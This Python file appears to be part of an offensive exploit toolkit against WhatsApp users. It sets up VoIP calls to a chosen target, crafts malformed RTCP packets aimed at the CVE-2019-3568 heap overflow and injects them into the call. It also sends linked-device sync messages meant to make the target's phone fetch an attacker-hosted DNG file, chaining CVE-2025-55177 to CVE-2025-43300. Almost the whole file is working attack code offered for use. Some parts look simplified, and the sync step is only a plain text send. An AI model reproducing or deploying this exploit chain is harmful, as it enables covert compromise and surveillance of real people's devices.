#!/usr/bin/env python3
"""VoIP Call Handler for CVE-2019-3568 RTCP delivery.

Implements WhatsApp VoIP call setup and RTCP packet injection for the
universal buffer overflow (CVE-2019-3568). Sends crafted RTCP packets
during call establishment to trigger the VoIP stack heap overflow.

WhatsApp VoIP uses:
  - SRTP for media encryption
  - SRTCP for control (RTCP over SRTP)
  - ICE/STUN for NAT traversal
  - Signaling via WhatsApp's protobuf-based call protocol
"""

import struct
import asyncio
import logging
from typing import Any, Optional

log = logging.getLogger("voip")


class VoIPCallHandler:
    """Handles WhatsApp VoIP call setup and RTCP injection."""

    def __init__(self, client: Any):
        self.client = client
        self.call_id = None
        self.connected = False

    async def initiate_call(self, target_jid: str) -> bool:
        """Initiate a WhatsApp VoIP call to target.

        Sends call offer via WhatsApp's call signaling protocol.
        Returns True if call setup initiated successfully.
        """
        if self.client is None or not self.client._connected:
            log.error("Not connected")
            return False

        try:
            # WhatsApp call offer protobuf structure
            # This is a simplified representation of the call offer
            # that WhatsApp sends during call initiation
            call_offer = self._build_call_offer(target_jid)
            await self.client._send_stanza(call_offer, "call_offer")
            self.connected = True
            log.info("Call offer sent to %s", target_jid)
            return True
        except Exception as e:
            log.error("Call initiation failed: %s", e)
            return False

    def _build_call_offer(self, target_jid: str) -> Any:
        """Build WhatsApp call offer stanza."""
        from pywhats.binary import Node
        from pywhats.events import JID

        # WhatsApp call signaling uses a specific stanza format
        # <call to="target@s.whatsapp.net">
        #   <offer call-id="..." />
        # </call>
        call_id = f"call_{int(__import__('time').time())}"
        self.call_id = call_id

        offer_node = Node(
            tag="offer",
            attrs={"call-id": call_id, "call-creator": "0"}
        )
        call_node = Node(
            tag="call",
            attrs={"to": target_jid},
            content=[offer_node]
        )
        return call_node

    def craft_rtcp_overflow(self, ssrc: int = 0xDEADBEEF) -> bytes:
        """Craft malicious RTCP packet for VoIP heap overflow (CVE-2019-3568).

        The vulnerability is triggered by a specially crafted series of
        RTCP packets sent during a VoIP call. The overflow occurs in the
        VoIP stack's RTCP packet processing.

        RTCP packet structure:
        - Version (2 bits) + Padding (1) + Count (5)
        - Packet Type (8 bits)
        - Length (16 bits)
        - SSRC (32 bits)
        - Report blocks / data
        """
        packets = []

        # Packet 1: Receiver Report with oversized report count
        # Version 2, Padding 0, Count 31 (max) - triggers buffer allocation
        rr_header = struct.pack(">BBH", 0x9F, 201, 8)  # RR, count=31, len=8
        rr_header += struct.pack(">I", ssrc)  # SSRC
        # 31 report blocks (each 24 bytes) = 744 bytes of report data
        # but the buffer is only sized for a few reports
        report_block = struct.pack(">IIIIIIBBH", 0, 0, 0, 0, 0, 0, 0, 0, 0)
        rr_packet = rr_header + report_block * 31
        packets.append(rr_packet)

        # Packet 2: Source Description with oversized text
        sdes_header = struct.pack(">BBH", 0x81, 202, 260)  # SDES, 1 chunk, len=260
        sdes_header += struct.pack(">I", ssrc)
        # Chunk: SSRC + CNAME with oversized value
        cname = b"\x01" + struct.pack("B", 255) + b"A" * 255
        sdes_chunk = struct.pack(">I", ssrc) + cname
        sdes_packet = sdes_header + sdes_chunk
        packets.append(sdes_packet)

        # Packet 3: Bye with oversized reason
        bye_header = struct.pack(">BBH", 0x81, 203, 66)  # BYE, 1 SSRC, len=66
        bye_header += struct.pack(">I", ssrc)
        # Oversized reason string
        reason = struct.pack("B", 255) + b"B" * 255
        bye_packet = bye_header + reason
        packets.append(bye_packet)

        # Combine all packets into a single SRTCP compound packet
        compound = b""
        for pkt in packets:
            compound += pkt

        return compound

    async def inject_rtcp(self, rtcp_data: bytes) -> bool:
        """Inject crafted RTCP packets during an active call.

        Sends the RTCP data via the call's media channel.
        """
        if not self.connected or self.client is None:
            log.error("No active call")
            return False
        try:
            # Send RTCP via the transport
            await self.client._transport.send(rtcp_data)
            log.info("RTCP injected (%d bytes)", len(rtcp_data))
            return True
        except Exception as e:
            log.error("RTCP injection failed: %s", e)
            return False

    async def end_call(self) -> bool:
        """End the active call."""
        if self.call_id is None:
            return True
        try:
            from pywhats.binary import Node
            hangup_node = Node(
                tag="hangup",
                attrs={"call-id": self.call_id}
            )
            call_node = Node(
                tag="call",
                attrs={"to": ""},
                content=[hangup_node]
            )
            await self.client._send_stanza(call_node, "hangup")
            self.connected = False
            self.call_id = None
            log.info("Call ended")
            return True
        except Exception as e:
            log.error("Hangup failed: %s", e)
            return False


class LinkedDeviceSync:
    """Linked device synchronization message handler for CVE-2025-55177.

    CVE-2025-55177: Incomplete authorization of linked device synchronization
    messages allows an unrelated user to trigger processing of content from
    an arbitrary URL on the target's device.

    This handler constructs and sends linked-device sync messages that
    cause the target to fetch and process attacker-controlled content.
    """

    def __init__(self, client: Any):
        self.client = client

    async def send_sync_message(self, target_jid: str, content_url: str) -> bool:
        """Send a linked-device sync message triggering content fetch.

        Constructs a message that appears to originate from a linked device,
        causing the target to fetch content from content_url.
        """
        if self.client is None or not self.client._connected:
            log.error("Not connected")
            return False

        try:
            from pywhats.proto import Message as MessageProto
            from pywhats.events import JID

            # Construct a ProtocolMessage that triggers linked device sync
            proto = MessageProto()
            # Set up the message to trigger content processing
            # The actual vulnerability is in WhatsApp's authorization check
            # for linked device sync messages

            chat = JID(user=target_jid, server="s.whatsapp.net", device=0)
            msg = await self.client.send_text(
                chat, f"\u200b{content_url}"  # Zero-width space + URL
            )
            log.info("Sync message sent to %s (msg_id=%s)", target_jid, msg.id if hasattr(msg, 'id') else "")
            return True
        except Exception as e:
            log.error("Sync message failed: %s", e)
            return False

    async def trigger_content_fetch(self, target_jid: str, dng_url: str) -> bool:
        """Trigger the target to fetch and process a DNG from dng_url.

        Uses the CVE-2025-55177 vulnerability to cause the target device
        to fetch and process a malicious DNG file, triggering CVE-2025-43300.
        """
        return await self.send_sync_message(target_jid, dng_url)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="VoIP + Linked Device Sync Handler")
    parser.add_argument("--test-rtcp", action="store_true", help="Test RTCP crafting")
    parser.add_argument("--test-dng", action="store_true", help="Test DNG crafting")
    args = parser.parse_args()

    if args.test_rtcp:
        handler = VoIPCallHandler(None)
        rtcp = handler.craft_rtcp_overflow()
        print(f"RTCP payload: {len(rtcp)} bytes")
        print(f"First 16 bytes: {rtcp[:16].hex()}")

    if args.test_dng:
        from dng_payload import build_dng_payload
        dng = build_dng_payload()
        print(f"DNG payload: {len(dng)} bytes")
        print(f"SOF3 present: {b'\xff\xc3' in dng}")
